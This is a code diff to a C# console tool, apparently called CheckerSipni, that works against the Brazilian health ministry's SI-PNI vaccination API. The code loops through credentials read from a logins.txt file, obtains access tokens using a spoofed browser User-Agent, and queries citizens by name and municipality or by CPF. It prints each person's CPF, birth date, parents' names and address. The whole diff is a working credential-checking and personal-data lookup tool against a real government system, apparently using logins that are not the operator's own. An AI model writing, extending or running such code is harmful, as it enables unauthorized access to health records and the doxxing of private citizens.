@@ -18,6 +18,8 @@ namespace CheckerSipni
 {
     class Program
     {
+        static string APITOKEN = "https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso";
+        static string APICONSULTACPF = "https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao/cpf/";
         static HttpClient Client = new HttpClient();
         static string ASCIIART = @"
  ____  _   _ ___ ____ _ _ 
@@ -31,9 +33,11 @@ Versao do SI-PNI para sistemas sem interface grafica
 
         static async Task Main()
         {
+            string tokenValido = "";
 
             while (true)
             {
+                Console.ResetColor();
                 Console.Clear();
                 Console.ForegroundColor = ConsoleColor.Blue;
                 Console.WriteLine(ASCIIART);
@@ -50,6 +54,12 @@ Versao do SI-PNI para sistemas sem interface grafica
                 Console.Write("Escolha uma opção: ");
                 var option = int.Parse(Console.ReadLine());
 
+                if (option != 0)
+                {
+                    Console.WriteLine("[*] Gerando token valido...");
+                    tokenValido = await GerarTokenValido();
+                }
+
                 // memento júnior
                 switch (option)
                 {
@@ -58,9 +68,13 @@ Versao do SI-PNI para sistemas sem interface grafica
                         var nome = Console.ReadLine();
                         Console.WriteLine("Codigo Municipio: ");
                         var codMun = Console.ReadLine();
+
+                        Console.WriteLine("[*] Buscando dados...");
                         if (!string.IsNullOrEmpty(nome.Trim()) && !string.IsNullOrEmpty(codMun.Trim()))
                         {
-                            await ConsultarEChecar(nome, codMun);
+
+                            var resNome = await ConsultaNome(tokenValido, nome, codMun);
+                            Resultado(resNome);
                             Console.WriteLine("Tecle enter para voltar...");
                             Console.ReadLine();
                         }
@@ -71,7 +85,12 @@ Versao do SI-PNI para sistemas sem interface grafica
                         }
                         break;
                     case 2:
-                        Console.WriteLine("Nao implementado.");
+                        Console.WriteLine("CPF: ");
+                        var cpf = Console.ReadLine();
+                        Console.WriteLine("[*] Buscando dados...");
+                        var resCpf = await ConsultaCPF(tokenValido, cpf);
+                        Console.WriteLine(resCpf);
+                        Console.WriteLine("Tecle enter para voltar...");
                         Console.ReadLine();
                         break;
                     case 3:
@@ -91,50 +110,50 @@ Versao do SI-PNI para sistemas sem interface grafica
                         Console.ReadLine();
                         break;
                 }
-
-                Console.ResetColor();
             }
         }
 
-        static async Task ConsultarEChecar(string nome, string codMun)
+        // Exibe os dados após a consulta
+        static void Resultado(Root dados)
+        {
+            if (dados != null && dados.records != null)
+            {
+                foreach (var dado in dados.records)
+                {
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("=====================================");
+                    Console.WriteLine($"NOME: {dado.nome ?? "N/A"}");
+                    Console.WriteLine($"CPF: {dado.cpf ?? "N/A"}");
+                    Console.WriteLine($"NASCIMENTO: {dado.dataNascimento ?? "N/A"}");
+                    Console.WriteLine($"MAE: {dado.nomeMae ?? "N/A"}");
+                    Console.WriteLine($"PAI: {dado.nomePai ?? "N/A"}");
+                    Console.WriteLine($"ENDEREÇO: UF = {dado.endereco?.siglaUf ?? "N/A"}, BAIRRO = {dado.endereco?.bairro ?? "N/A"}, NUMERO = {dado.endereco?.numero ?? "N/A"}, CEP = {dado.endereco?.cep ?? "N/A"}, COMPLEMENTO = {dado.endereco?.complemento ?? "N/A"}");
+                    Console.WriteLine("=====================================\n");
+                }
+
+                return;
+            }
+            else
+            {
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("[!] ATENCAO: Nenhum dado encontrado.\n");
+            }
+        }
+
+        static async Task<string> GerarTokenValido()
         {
             var loginsFilePath = @".\logins.txt";
             var lines = File.ReadLines(loginsFilePath);
-
+            string validToken = "";
             foreach (var credential in lines)
             {
-                var validToken = await CheckLogins(new List<string> { credential });
-
-                Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine($"Testando dados com login {credential}");
-
-                var dados = await Consulta(validToken.ToString(), nome, codMun);
-                if (dados != null && dados.records != null)
-                {
-                    foreach (var dado in dados.records)
-                    {
-                        Console.ForegroundColor = ConsoleColor.Green;
-                        Console.WriteLine("=====================================");
-                        Console.WriteLine($"NOME: {dado.nome ?? "N/A"}");
-                        Console.WriteLine($"CPF: {dado.cpf ?? "N/A"}");
-                        Console.WriteLine($"NASCIMENTO: {dado.dataNascimento ?? "N/A"}");
-                        Console.WriteLine($"MAE: {dado.nomeMae ?? "N/A"}");
-                        Console.WriteLine($"PAI: {dado.nomePai ?? "N/A"}");
-                        Console.WriteLine($"ENDEREÇO: UF = {dado.endereco?.siglaUf ?? "N/A"}, BAIRRO = {dado.endereco?.bairro ?? "N/A"}, NUMERO = {dado.endereco?.numero ?? "N/A"}, CEP = {dado.endereco?.cep ?? "N/A"}, COMPLEMENTO = {dado.endereco?.complemento ?? "N/A"}");
-                        Console.WriteLine("=====================================\n");
-                    }
-
-                    return;
-                }
-                else
-                {
-                    Console.ForegroundColor = ConsoleColor.Yellow;
-                    Console.WriteLine("[!] ATENCAO: Nenhum dado encontrado.\n");
-                    continue;
-                }
+                validToken = await CheckLogins(new List<string> { credential });
             }
+
+            return validToken;
         }
 
+        // Checar se os logins.txt estão válidos
         static async Task<string> CheckLogins(List<string> credentials)
         {
             try
@@ -148,7 +167,7 @@ Versao do SI-PNI para sistemas sem interface grafica
                     Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
                     Client.DefaultRequestHeaders.Add("X-Authorization", $"Basic {encodedLogin}");
 
-                    var response = await Client.PostAsync("https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso", null);
+                    var response = await Client.PostAsync(APITOKEN, null);
                     var json = await response.Content.ReadAsStringAsync();
                     if (response.IsSuccessStatusCode)
                     {
@@ -167,7 +186,7 @@ Versao do SI-PNI para sistemas sem interface grafica
         }
 
         // Faz a requisição na API com o token Bearer e retorna a classe com os dados deserializados
-        static async Task<Root> Consulta(string basicToken, string nome, string codMun)
+        static async Task<Root> ConsultaNome(string basicToken, string nome, string codMun)
         {
             try
             {
@@ -187,6 +206,26 @@ Versao do SI-PNI para sistemas sem interface grafica
             {
                 Console.WriteLine($"[-] ERRO: {ex.Message}");
                 return null;
+            }
+        }
+
+        static async Task<string> ConsultaCPF(string basicToken, string cpf)
+        {
+            try
+            {
+                Client.DefaultRequestHeaders.Clear();
+                Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
+                Client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", basicToken);
+
+                var response = await Client.GetAsync($"{APICONSULTACPF}/{cpf}");
+                var json = await response.Content.ReadAsStringAsync();
+                return json;
+                //Root root = JsonSerializer.Deserialize(json);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] ERRO: {ex.Message}");
+                return "";
             }
         }
     }
